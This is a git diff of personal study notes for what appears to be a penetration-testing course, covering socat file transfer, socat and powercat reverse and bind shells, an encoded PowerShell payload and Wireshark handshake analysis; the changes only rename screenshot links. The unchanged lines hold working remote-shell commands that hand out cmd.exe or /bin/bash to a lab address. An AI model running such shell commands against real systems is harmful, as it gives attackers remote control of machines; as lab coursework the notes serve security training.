@@ -8,7 +8,7 @@ host
 `sudo socat TCP4-LISTEN:443,fork file:powercat.ps1`
 recipient
 `socat TCP4:192.168.119.249:443 file:received_powercat.ps1,create`
-![[Pasted image 20220218121253.png]]
+![[powercat_received.png]]
 
 2.  Use **socat ** to create an encrypted reverse shell from your Windows system to your Kali machine.
 generate the key
@@ -19,7 +19,7 @@ create listener using .pem and execute shell
 `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
 connect 
 `socat - OPENSSL:192.168.119.249:443,verify=0`
-![[Pasted image 20220218122213.png]]
+![[socat_openssl.png]]
 # !!SKIPPED QUESTIONS RETURN HERE!!
 3.  Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
 use previously generated .pem
@@ -45,8 +45,8 @@ start listener on local machine
 `nc -lnvp 9999`
 use powershell on remote machine to connect to listener
 `powercat -c <IP> -p <PORT> -e cmd.exe`
-![[Pasted image 20220218171345.png]]
-![[Pasted image 20220218171401.png]]
+![[powercat_revshell.png]]
+![[root_through_powercat.png]]
 2.  Use **PowerShell** and **powercat** to create a bind shell on your Windows system and connect to it from your Kali machine. Can you also use **powercat** to connect to it locally?
 create bind shell in powershell with powercat
 `powercat -l -p 443 -e cmd.exe`
@@ -68,8 +68,8 @@ or if encoded, running posershell.exe with -E flag and encoded payload
 `powershell.exe -E <ENCODED_PAYLOAD_HERE>`
 ###### easy copy/paste in powershell
 `Get-Content C:\Users\user1\.ssh\id_ed25519.pub | Set-Clipboard`
-![[Pasted image 20220218173555.png]]
-![[Pasted image 20220218173813.png]]
+![[powershell_encoded_revshell.png]]
+![[reverse_connection.png]]
 
 # exercises 4.4.6
 #### Exercises
@@ -83,21 +83,21 @@ connect to pop server via nc
 attempt to log into pop server 
 `USER student`
 `PASS lab`
-![[Pasted image 20220218183021.png]]
+![[wireshark_handshake2.png]]
 2.  Read and understand the output. Where is the three-way handshake happening? Where is the connection closed?
 Frame 1, 2, and 3 contain the three-way handshake
-![[Pasted image 20220218183223.png]]
+![[wireshark_handshake.png]]
 frame 13 contains RST, ack which is used to reset/shutdown a connection
-![[Pasted image 20220218183755.png]]
+![[wireshark_RST.png]]
 
 3.  Follow the TCP stream to read the login attempt.
-![[Pasted image 20220218183815.png]]
+![[wireshark_response.png]]
 
 4.  Use the display filter to only monitor traffic on port 110.
 this can be done one the startup page via the capture filter
-![[Pasted image 20220218183859.png]]
+![[wireshark_filtering2.png]]
 or with the display filter once the capture has begun
-![[Pasted image 20220218184037.png]]
+![[wireshark_filtering.png]]
 
 5.  Run a new session, this time using the capture filter to only collect traffic on port 110.
 see above section for capture filtering
